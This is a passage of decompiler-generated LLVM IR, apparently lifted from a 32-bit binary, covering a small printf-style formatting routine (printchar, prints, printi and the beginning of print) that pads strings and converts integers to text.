  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_80483e1 = icmp eq i32* %arg1, null
  br i1 %v4_80483e1, label %dec_label_pc_8048400, label %dec_label_pc_80483e7

dec_label_pc_80483e7:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_80483ea = load i32, i32* %arg1, align 4
  %v3_80483ef = inttoptr i32 %v2_80483ea to i8*
  store i8 %tmp8, i8* %v3_80483ef, align 1
  %v2_80483f4 = load i32, i32* %arg1, align 4
  %v1_80483f6 = add i32 %v2_80483f4, 1
  store i32 %v1_80483f6, i32* %arg1, align 4
  br label %dec_label_pc_8048413

dec_label_pc_8048400:                             ; preds = %entry
  %v3_804840b = bitcast i8* %stack_var_8 to i32*
  %v4_804840b = call i32 @__libc_write(i32 1, i32* %v3_804840b, i32 1)
  br label %dec_label_pc_8048413

dec_label_pc_8048413:                             ; preds = %dec_label_pc_80483e7, %dec_label_pc_8048400
  %v0_8048414 = phi i32 [ %tmp3, %dec_label_pc_80483e7 ], [ %v4_804840b, %dec_label_pc_8048400 ]
  ret i32 %v0_8048414

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048413, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp25 = icmp slt i32 %arg3, 1
  br i1 %tmp25, label %dec_label_pc_8048475, label %dec_label_pc_804842f

dec_label_pc_804842f:                             ; preds = %entry
  %v4_8048436 = ptrtoint i8* %arg2 to i32
  %v2_804844756 = load i8, i8* %arg2, align 1
  %v3_804844757 = zext i8 %v2_804844756 to i32
  %v5_804844758 = and i32 %v4_8048436, -256
  %v6_804844759 = or i32 %v3_804844757, %v5_804844758
  %v4_804844960 = icmp eq i8 %v2_804844756, 0
  %v1_804844b61 = icmp eq i1 %v4_804844960, false
  br i1 %v1_804844b61, label %dec_label_pc_804843e, label %dec_label_pc_804844d

dec_label_pc_804843e:                             ; preds = %dec_label_pc_804842f, %dec_label_pc_804843e
  %v6_804844764 = phi i32 [ %v6_8048447, %dec_label_pc_804843e ], [ %v6_804844759, %dec_label_pc_804842f ]
  %v4_804844463 = phi i32 [ %v5_8048441, %dec_label_pc_804843e ], [ %v4_8048436, %dec_label_pc_804842f ]
  %stack_var_-12.062 = phi i32 [ %v4_804843e, %dec_label_pc_804843e ], [ 0, %dec_label_pc_804842f ]
  %v4_804843e = add i32 %stack_var_-12.062, 1
  %v5_8048441 = add i32 %v4_804844463, 1
  %v22_8048441 = inttoptr i32 %v5_8048441 to i8*
  %v2_8048447 = load i8, i8* %v22_8048441, align 1
  %v3_8048447 = zext i8 %v2_8048447 to i32
  %v5_8048447 = and i32 %v6_804844764, -256
  %v6_8048447 = or i32 %v3_8048447, %v5_8048447
  %v4_8048449 = icmp eq i8 %v2_8048447, 0
  %v1_804844b = icmp eq i1 %v4_8048449, false
  br i1 %v1_804844b, label %dec_label_pc_804843e, label %dec_label_pc_804844d

dec_label_pc_804844d:                             ; preds = %dec_label_pc_804843e, %dec_label_pc_804842f
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_804842f ], [ %v4_804843e, %dec_label_pc_804843e ]
  %v5_8048453 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_8048453, label %dec_label_pc_804845e, label %dec_label_pc_8048464

dec_label_pc_804845e:                             ; preds = %dec_label_pc_804844d
  %v5_8048461 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_8048464

dec_label_pc_8048464:                             ; preds = %dec_label_pc_804844d, %dec_label_pc_804845e
  %storemerge = phi i32 [ %v5_8048461, %dec_label_pc_804845e ], [ 0, %dec_label_pc_804844d ]
  %v1_8048467 = and i32 %arg4, 2
  %tmp26 = mul nuw nsw i32 %v1_8048467, 8
  %tmp27 = or i32 %tmp26, 32
  br label %dec_label_pc_8048475

dec_label_pc_8048475:                             ; preds = %dec_label_pc_8048464, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_8048464 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp27, %dec_label_pc_8048464 ]
  %v1_8048478 = urem i32 %arg4, 2
  %v2_8048478 = icmp eq i32 %v1_8048478, 0
  %v1_804847d = icmp eq i1 %v2_8048478, false
  %.pre11 = inttoptr i32 %arg1 to i32*
  br i1 %v1_804847d, label %dec_label_pc_80484bf.preheader, label %dec_label_pc_8048498.preheader

dec_label_pc_8048498.preheader:                   ; preds = %dec_label_pc_8048475
  %tmp2849 = icmp slt i32 %stack_var_12.0, 1
  %tmp2950 = icmp eq i1 %tmp2849, false
  br i1 %tmp2950, label %dec_label_pc_8048481.lr.ph, label %dec_label_pc_80484bf.preheader

dec_label_pc_8048481.lr.ph:                       ; preds = %dec_label_pc_8048498.preheader
  br label %dec_label_pc_8048481

dec_label_pc_8048481:                             ; preds = %dec_label_pc_8048481.lr.ph, %dec_label_pc_8048481
  %stack_var_-20.052 = phi i32 [ 0, %dec_label_pc_8048481.lr.ph ], [ %v4_8048492, %dec_label_pc_8048481 ]
  %stack_var_12.151 = phi i32 [ %stack_var_12.0, %dec_label_pc_8048481.lr.ph ], [ %v4_8048495, %dec_label_pc_8048481 ]
  %v3_804848a = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_8048492 = add i32 %stack_var_-20.052, 1
  %v4_8048495 = add i32 %stack_var_12.151, -1
  %tmp28 = icmp slt i32 %v4_8048495, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_8048481, label %dec_label_pc_80484bf.preheader

dec_label_pc_80484bf.preheader:                   ; preds = %dec_label_pc_8048498.preheader, %dec_label_pc_8048481, %dec_label_pc_8048475
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048475 ], [ %stack_var_12.0, %dec_label_pc_8048498.preheader ], [ %v4_8048495, %dec_label_pc_8048481 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048475 ], [ 0, %dec_label_pc_8048498.preheader ], [ %v4_8048492, %dec_label_pc_8048481 ]
  %v2_80484c238 = load i8, i8* %arg2, align 1
  %v4_80484c442 = icmp eq i8 %v2_80484c238, 0
  %v1_80484c643 = icmp eq i1 %v4_80484c442, false
  br i1 %v1_80484c643, label %dec_label_pc_80484a0.lr.ph, label %dec_label_pc_80484e1.preheader

dec_label_pc_80484a0.lr.ph:                       ; preds = %dec_label_pc_80484bf.preheader
  %v4_80484bf37 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_80484a0

dec_label_pc_80484a0:                             ; preds = %dec_label_pc_80484a0.lr.ph, %dec_label_pc_80484a0
  %v4_80484bf46 = phi i32 [ %v4_80484bf37, %dec_label_pc_80484a0.lr.ph ], [ %v5_80484bc, %dec_label_pc_80484a0 ]
  %stack_var_-20.145 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484a0.lr.ph ], [ %v4_80484b9, %dec_label_pc_80484a0 ]
  %stack_var_8.044 = phi i8* [ %arg2, %dec_label_pc_80484a0.lr.ph ], [ %v22_80484bc, %dec_label_pc_80484a0 ]
  %v2_80484a3 = load i8, i8* %stack_var_8.044, align 1
  %v3_80484a3 = zext i8 %v2_80484a3 to i32
  %v3_80484b1 = call i32 @printchar(i32* %.pre11, i32 %v3_80484a3)
  %v4_80484b9 = add i32 %stack_var_-20.145, 1
  %v5_80484bc = add i32 %v4_80484bf46, 1
  %v22_80484bc = inttoptr i32 %v5_80484bc to i8*
  %v2_80484c2 = load i8, i8* %v22_80484bc, align 1
  %v4_80484c4 = icmp eq i8 %v2_80484c2, 0
  %v1_80484c6 = icmp eq i1 %v4_80484c4, false
  br i1 %v1_80484c6, label %dec_label_pc_80484a0, label %dec_label_pc_80484e1.preheader

dec_label_pc_80484e1.preheader:                   ; preds = %dec_label_pc_80484a0, %dec_label_pc_80484bf.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484bf.preheader ], [ %v4_80484b9, %dec_label_pc_80484a0 ]
  %tmp3033 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp3134 = icmp eq i1 %tmp3033, false
  br i1 %tmp3134, label %dec_label_pc_80484ca.lr.ph, label %dec_label_pc_80484e7

dec_label_pc_80484ca.lr.ph:                       ; preds = %dec_label_pc_80484e1.preheader
  br label %dec_label_pc_80484ca

dec_label_pc_80484ca:                             ; preds = %dec_label_pc_80484ca.lr.ph, %dec_label_pc_80484ca
  %stack_var_-20.236 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_80484ca.lr.ph ], [ %v4_80484db, %dec_label_pc_80484ca ]
  %stack_var_12.335 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_80484ca.lr.ph ], [ %v4_80484de, %dec_label_pc_80484ca ]
  %v3_80484d3 = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_80484db = add i32 %stack_var_-20.236, 1
  %v4_80484de = add i32 %stack_var_12.335, -1
  %tmp30 = icmp slt i32 %v4_80484de, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_80484ca, label %dec_label_pc_80484e7

dec_label_pc_80484e7:                             ; preds = %dec_label_pc_80484ca, %dec_label_pc_80484e1.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_80484e1.preheader ], [ %v4_80484db, %dec_label_pc_80484ca ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_80484bc, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 0 }
  uselistorder i32 %v5_8048441, { 1, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_80484ca, { 1, 0 }
  uselistorder label %dec_label_pc_80484a0, { 1, 0 }
  uselistorder label %dec_label_pc_80484bf.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048481, { 1, 0 }
  uselistorder label %dec_label_pc_8048464, { 1, 0 }
  uselistorder label %dec_label_pc_804843e, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_8048503 = sext i32 %tmp35 to i64
  %v4_8048506 = icmp eq i32 %tmp35, 0
  %v5_8048506 = icmp slt i32 %tmp35, 0
  %v1_804850a = icmp eq i1 %v4_8048506, false
  br i1 %v1_804850a, label %dec_label_pc_8048531, label %dec_label_pc_804850c

dec_label_pc_804850c:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_8048521 = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_804860c

dec_label_pc_8048531:                             ; preds = %entry
  %v4_8048531 = icmp eq i32 %tmp28, 0
  br i1 %v4_8048531, label %dec_label_pc_8048552, label %dec_label_pc_8048537

dec_label_pc_8048537:                             ; preds = %dec_label_pc_8048531
  %v12_8048537 = icmp eq i32 %tmp27, 10
  %v1_804853b = icmp eq i1 %v12_8048537, false
  br i1 %v1_804853b, label %dec_label_pc_8048552, label %dec_label_pc_804853d

dec_label_pc_804853d:                             ; preds = %dec_label_pc_8048537
  %v1_8048541 = icmp eq i1 %v5_8048506, false
  br i1 %v1_8048541, label %dec_label_pc_8048552, label %dec_label_pc_8048543

dec_label_pc_8048543:                             ; preds = %dec_label_pc_804853d
  %v1_804854d = sub i32 0, %tmp35
  %v5_804854f = sext i32 %v1_804854d to i64
  br label %dec_label_pc_8048552

dec_label_pc_8048552:                             ; preds = %dec_label_pc_804853d, %dec_label_pc_8048537, %dec_label_pc_8048531, %dec_label_pc_8048543
  %stack_var_-24.0 = phi i64 [ %v5_8048503, %dec_label_pc_8048531 ], [ %v5_8048503, %dec_label_pc_8048537 ], [ %v5_8048503, %dec_label_pc_804853d ], [ %v5_804854f, %dec_label_pc_8048543 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_8048531 ], [ 0, %dec_label_pc_8048537 ], [ 0, %dec_label_pc_804853d ], [ 1, %dec_label_pc_8048543 ]
  %v15_8048555 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_80485b37 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485b38 = icmp eq i32 %v4_80485b37, 0
  %v1_80485b715 = icmp eq i1 %v5_80485b38, false
  br i1 %v1_80485b715, label %dec_label_pc_8048563.lr.ph, label %dec_label_pc_80485b9

dec_label_pc_8048563.lr.ph:                       ; preds = %dec_label_pc_8048552
  %v5_8048566 = sext i32 %tmp27 to i64
  br label %dec_label_pc_8048563

dec_label_pc_8048563:                             ; preds = %dec_label_pc_8048563.lr.ph, %dec_label_pc_804858b
  %v3_804858b18 = phi i8* [ %tmp48, %dec_label_pc_8048563.lr.ph ], [ %v22_804858b, %dec_label_pc_804858b ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048563.lr.ph ], [ %v5_80485b0, %dec_label_pc_804858b ]
  %v6_8048571 = and i64 %stack_var_-24.116, 4294967295
  %v12_8048571 = udiv i64 %v6_8048571, %v5_8048566
  %v13_8048571 = trunc i64 %v12_8048571 to i32
  %v14_8048571 = urem i64 %v6_8048571, %v5_8048566
  %v5_8048576 = trunc i64 %v14_8048571 to i8
  %v7_804857d = icmp sgt i8 %v5_8048576, 9
  br i1 %v7_804857d, label %dec_label_pc_804857f, label %dec_label_pc_804858b

dec_label_pc_804857f:                             ; preds = %dec_label_pc_8048563
  %tmp52 = trunc i64 %v14_8048571 to i32
  %v5_8048582 = add i32 %tmp52, %tmp
  %v1_8048585 = add i32 %v5_8048582, 198
  %v11_8048585 = trunc i32 %v1_8048585 to i8
  br label %dec_label_pc_804858b

dec_label_pc_804858b:                             ; preds = %dec_label_pc_8048563, %dec_label_pc_804857f
  %stack_var_-36.0 = phi i8 [ %v11_8048585, %dec_label_pc_804857f ], [ %v5_8048576, %dec_label_pc_8048563 ]
  %v4_804858b = ptrtoint i8* %v3_804858b18 to i32
  %v5_804858b = add i32 %v4_804858b, -1
  %v22_804858b = inttoptr i32 %v5_804858b to i8*
  %v1_8048591 = add i8 %stack_var_-36.0, 48
  store i8 %v1_8048591, i8* %v22_804858b, align 1
  %v5_80485b0 = sext i32 %v13_8048571 to i64
  %v5_80485b3 = icmp eq i32 %v13_8048571, 0
  %v1_80485b7 = icmp eq i1 %v5_80485b3, false
  br i1 %v1_80485b7, label %dec_label_pc_8048563, label %dec_label_pc_80485b3.dec_label_pc_80485b9_crit_edge

dec_label_pc_80485b3.dec_label_pc_80485b9_crit_edge: ; preds = %dec_label_pc_804858b
  store i8* %v22_804858b, i8** %stack_var_-40, align 4
  br label %dec_label_pc_80485b9

dec_label_pc_80485b9:                             ; preds = %dec_label_pc_80485b3.dec_label_pc_80485b9_crit_edge, %dec_label_pc_8048552
  %v3_80485f6622 = phi i32 [ %v5_804858b, %dec_label_pc_80485b3.dec_label_pc_80485b9_crit_edge ], [ %v15_8048555, %dec_label_pc_8048552 ]
  %v3_80485e7 = phi i8* [ %v22_804858b, %dec_label_pc_80485b3.dec_label_pc_80485b9_crit_edge ], [ %tmp48, %dec_label_pc_8048552 ]
  %v4_80485b9 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_80485b9, label %dec_label_pc_80485f0, label %dec_label_pc_80485bf

dec_label_pc_80485bf:                             ; preds = %dec_label_pc_80485b9
  %v4_80485bf = icmp eq i32 %tmp31, 0
  br i1 %v4_80485bf, label %dec_label_pc_80485e7, label %dec_label_pc_80485c5

dec_label_pc_80485c5:                             ; preds = %dec_label_pc_80485bf
  %v1_80485c8 = and i32 %tmp32, 2
  %v2_80485c8 = icmp eq i32 %v1_80485c8, 0
  br i1 %v2_80485c8, label %dec_label_pc_80485e7, label %dec_label_pc_80485cf

dec_label_pc_80485cf:                             ; preds = %dec_label_pc_80485c5
  %v3_80485d7 = inttoptr i32 %arg1 to i32*
  %v4_80485d7 = call i32 @printchar(i32* %v3_80485d7, i32 45)
  %v4_80485e2 = add i32 %tmp31, -1
  br label %dec_label_pc_80485f0

dec_label_pc_80485e7:                             ; preds = %dec_label_pc_80485c5, %dec_label_pc_80485bf
  %v4_80485e7 = ptrtoint i8* %v3_80485e7 to i32
  %v5_80485e7 = add i32 %v4_80485e7, -1
  %v22_80485e7 = inttoptr i32 %v5_80485e7 to i8*
  store i8* %v22_80485e7, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_80485e7, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80485f66.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_80485f0

dec_label_pc_80485f0:                             ; preds = %dec_label_pc_80485b9, %dec_label_pc_80485cf, %dec_label_pc_80485e7
  %v3_80485f66 = phi i32 [ %v3_80485f6622, %dec_label_pc_80485b9 ], [ %v3_80485f66.pre, %dec_label_pc_80485e7 ], [ %v3_80485f6622, %dec_label_pc_80485cf ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_80485b9 ], [ %tmp31, %dec_label_pc_80485e7 ], [ %v4_80485e2, %dec_label_pc_80485cf ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80485b9 ], [ 0, %dec_label_pc_80485e7 ], [ 1, %dec_label_pc_80485cf ]
  %v1_80485fc.cast = inttoptr i32 %v3_80485f66 to i8*
  %v6_80485fc = call i32 @prints(i32 %arg1, i8* %v1_80485fc.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_8048607 = add i32 %v6_80485fc, %stack_var_-28.0
  br label %dec_label_pc_804860c

dec_label_pc_804860c:                             ; preds = %dec_label_pc_804850c, %dec_label_pc_80485f0
  %storemerge = phi i32 [ %v2_8048607, %dec_label_pc_80485f0 ], [ %v6_8048521, %dec_label_pc_804850c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_804858b, { 0, 1, 3, 2 }
  uselistorder i8 %v5_8048576, { 1, 0 }
  uselistorder i64 %v6_8048571, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804860c, { 1, 0 }
  uselistorder label %dec_label_pc_80485f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804858b, { 1, 0 }
  uselistorder label %dec_label_pc_8048563, { 1, 0 }
  uselistorder label %dec_label_pc_8048552, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v15_8048614 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048806 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.444 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804883c45 = load i8, i8* %stack_var_8.444, align 1
  %v3_804883c46 = zext i8 %v2_804883c45 to i32
  %v5_804883c47 = and i32 %arg2, -256
  %v6_804883c48 = or i32 %v3_804883c46, %v5_804883c47
  store i32 %v6_804883c48, i32* %eax.global-to-local, align 4
  %v4_804883e49 = icmp eq i8 %v2_804883c45, 0
  %v1_804884050 = icmp eq i1 %v4_804883e49, false
  br i1 %v1_804884050, label %dec_label_pc_8048623, label %dec_label_pc_8048846

dec_label_pc_8048623:                             ; preds = %entry, %dec_label_pc_8048836
  %v0_8048824 = phi i32 [ %v4_80486e866, %dec_label_pc_8048836 ], [ %v15_8048614, %entry ]
  %v5_804883c56 = phi i32 [ %v5_804883c, %dec_label_pc_8048836 ], [ %v5_804883c47, %entry ]
  %stack_var_8.455 = phi i8* [ %stack_var_8.4, %dec_label_pc_8048836 ], [ %stack_var_8.444, %entry ]
  %stack_var_-28.154 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8048836 ], [ 0, %entry ]
  %stack_var_8.4.in53 = phi i32 [ %v5_8048836, %dec_label_pc_8048836 ], [ %arg2, %entry ]
  %stack_var_12.152 = phi i32 [ %stack_var_12.0, %dec_label_pc_8048836 ], [ %arg3, %entry ]
  %stack_var_-24.151 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8048836 ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in53, i32* %eax.global-to-local, align 4
  %v2_8048626 = load i8, i8* %stack_var_8.455, align 1
  %v3_8048626 = zext i8 %v2_8048626 to i32
  %v6_8048626 = or i32 %v3_8048626, %v5_804883c56
  store i32 %v6_8048626, i32* %eax.global-to-local, align 4
  %v10_8048628 = icmp eq i8 %v2_8048626, 37
  %v1_804862a = icmp eq i1 %v10_8048628, false
  br i1 %v1_804862a, label %dec_label_pc_804881a, label %dec_label_pc_8048630

dec_label_pc_8048630:                             ; preds = %dec_label_pc_8048623
  %v5_8048630 = add i32 %stack_var_8.4.in53, 1
  %v22_8048630 = inttoptr i32 %v5_8048630 to i8*
  store i32 %v5_8048630, i32* %eax.global-to-local, align 4
  %v2_8048643 = load i8, i8* %v22_8048630, align 1
  %v3_8048643 = zext i8 %v2_8048643 to i32
  %v5_8048643 = and i32 %v5_8048630, -256
  %v6_8048643 = or i32 %v3_8048643, %v5_8048643
  store i32 %v6_8048643, i32* %eax.global-to-local, align 4
  %v4_8048645 = icmp eq i8 %v2_8048643, 0
  br i1 %v4_8048645, label %dec_label_pc_8048846, label %dec_label_pc_804864d

dec_label_pc_804864d:                             ; preds = %dec_label_pc_8048630
  store i32 %v5_8048630, i32* %eax.global-to-local, align 4
  %v2_8048650 = load i8, i8* %v22_8048630, align 1
  %v3_8048650 = zext i8 %v2_8048650 to i32
  %v6_8048650 = or i32 %v3_8048650, %v5_8048643
  store i32 %v6_8048650, i32* %eax.global-to-local, align 4
  %v10_8048652 = icmp eq i8 %v2_8048650, 37
  br i1 %v10_8048652, label %dec_label_pc_804881a, label %dec_label_pc_804865a

dec_label_pc_804865a:                             ; preds = %dec_label_pc_804864d
  store i32 %v5_8048630, i32* %eax.global-to-local, align 4
  %v2_804865d = load i8, i8* %v22_8048630, align 1
  %v3_804865d = zext i8 %v2_804865d to i32
  %v6_804865d = or i32 %v3_804865d, %v5_8048643
  store i32 %v6_804865d, i32* %eax.global-to-local, align 4
  %v10_804865f = icmp eq i8 %v2_804865d, 45
  %v1_8048661 = icmp eq i1 %v10_804865f, false
  br i1 %v1_8048661, label %dec_label_pc_8048676.preheader, label %dec_label_pc_8048663

dec_label_pc_8048663:                             ; preds = %dec_label_pc_804865a
  %v5_8048663 = add i32 %stack_var_8.4.in53, 2
  %v22_8048663 = inttoptr i32 %v5_8048663 to i8*
  br label %dec_label_pc_8048676.preheader

dec_label_pc_8048676.preheader:                   ; preds = %dec_label_pc_8048663, %dec_label_pc_804865a
  %stack_var_8.0.ph = phi i8* [ %v22_8048630, %dec_label_pc_804865a ], [ %v22_8048663, %dec_label_pc_8048663 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804865a ], [ 1, %dec_label_pc_8048663 ]
  %v4_804867615 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804867615, i32* %eax.global-to-local, align 4
  %v2_804867916 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804867917 = zext i8 %v2_804867916 to i32
  %v5_804867918 = and i32 %v4_804867615, -256
  %v6_804867919 = or i32 %v3_804867917, %v5_804867918
  store i32 %v6_804867919, i32* %eax.global-to-local, align 4
  %v7_804867b21 = icmp eq i8 %v2_804867916, 48
  br i1 %v7_804867b21, label %dec_label_pc_804866f, label %dec_label_pc_80486a5.preheader

dec_label_pc_804866f:                             ; preds = %dec_label_pc_8048676.preheader, %dec_label_pc_804866f
  %v4_804867623 = phi i32 [ %v5_804866f, %dec_label_pc_804866f ], [ %v4_804867615, %dec_label_pc_8048676.preheader ]
  %stack_var_-32.022 = phi i32 [ %v4_8048672, %dec_label_pc_804866f ], [ %stack_var_-32.0.ph, %dec_label_pc_8048676.preheader ]
  %v5_804866f = add i32 %v4_804867623, 1
  %v22_804866f = inttoptr i32 %v5_804866f to i8*
  %v4_8048672 = or i32 %stack_var_-32.022, 2
  store i32 %v5_804866f, i32* %eax.global-to-local, align 4
  %v2_8048679 = load i8, i8* %v22_804866f, align 1
  %v3_8048679 = zext i8 %v2_8048679 to i32
  %v5_8048679 = and i32 %v5_804866f, -256
  %v6_8048679 = or i32 %v3_8048679, %v5_8048679
  store i32 %v6_8048679, i32* %eax.global-to-local, align 4
  %v7_804867b = icmp eq i8 %v2_8048679, 48
  br i1 %v7_804867b, label %dec_label_pc_804866f, label %dec_label_pc_80486a5.preheader

dec_label_pc_80486a5.preheader:                   ; preds = %dec_label_pc_804866f, %dec_label_pc_8048676.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_8048676.preheader ], [ %v4_8048672, %dec_label_pc_804866f ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_8048676.preheader ], [ %v22_804866f, %dec_label_pc_804866f ]
  %v4_80486a525 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_80486a525, i32* %eax.global-to-local, align 4
  %v2_80486a826 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_80486a827 = zext i8 %v2_80486a826 to i32
  %v5_80486a828 = and i32 %v4_80486a525, -256
  %v6_80486a829 = or i32 %v3_80486a827, %v5_80486a828
  store i32 %v6_80486a829, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_80486a826, 48
  br i1 %tmp67, label %dec_label_pc_80486b7, label %dec_label_pc_80486ae

dec_label_pc_8048681:                             ; preds = %dec_label_pc_80486ae
  %v2_804868a = mul i32 %stack_var_-36.032, 10
  store i32 %v4_80486a534, i32* %eax.global-to-local, align 4
  %v2_8048692 = load i8, i8* %stack_var_8.133, align 1
  %v3_8048692 = zext i8 %v2_8048692 to i32
  %v5_8048699 = add i32 %v3_8048692, %v2_804868a
  %v1_804869c = add i32 %v5_8048699, -48
  %v5_80486a2 = add i32 %v4_80486a534, 1
  %v22_80486a2 = inttoptr i32 %v5_80486a2 to i8*
  store i32 %v5_80486a2, i32* %eax.global-to-local, align 4
  %v2_80486a8 = load i8, i8* %v22_80486a2, align 1
  %v3_80486a8 = zext i8 %v2_80486a8 to i32
  %v5_80486a8 = and i32 %v5_80486a2, -256
  %v6_80486a8 = or i32 %v3_80486a8, %v5_80486a8
  store i32 %v6_80486a8, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i8 %v2_80486a8, 48
  br i1 %tmp68, label %dec_label_pc_80486b7, label %dec_label_pc_80486ae

dec_label_pc_80486ae:                             ; preds = %dec_label_pc_80486a5.preheader, %dec_label_pc_8048681
  %v5_80486a835 = phi i32 [ %v5_80486a8, %dec_label_pc_8048681 ], [ %v5_80486a828, %dec_label_pc_80486a5.preheader ]
  %v4_80486a534 = phi i32 [ %v5_80486a2, %dec_label_pc_8048681 ], [ %v4_80486a525, %dec_label_pc_80486a5.preheader ]
  %stack_var_8.133 = phi i8* [ %v22_80486a2, %dec_label_pc_8048681 ], [ %stack_var_8.0.lcssa, %dec_label_pc_80486a5.preheader ]
  %stack_var_-36.032 = phi i32 [ %v1_804869c, %dec_label_pc_8048681 ], [ 0, %dec_label_pc_80486a5.preheader ]
  store i32 %v4_80486a534, i32* %eax.global-to-local, align 4
  %v2_80486b1 = load i8, i8* %stack_var_8.133, align 1
  %v3_80486b1 = zext i8 %v2_80486b1 to i32
  %v6_80486b1 = or i32 %v3_80486b1, %v5_80486a835
  store i32 %v6_80486b1, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i8 %v2_80486b1, 58
  br i1 %tmp69, label %dec_label_pc_8048681, label %dec_label_pc_80486b7

dec_label_pc_80486b7:                             ; preds = %dec_label_pc_8048681, %dec_label_pc_80486ae, %dec_label_pc_80486a5.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_80486a5.preheader ], [ %stack_var_-36.032, %dec_label_pc_80486ae ], [ %v1_804869c, %dec_label_pc_8048681 ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_80486a5.preheader ], [ %stack_var_8.133, %dec_label_pc_80486ae ], [ %v22_80486a2, %dec_label_pc_8048681 ]
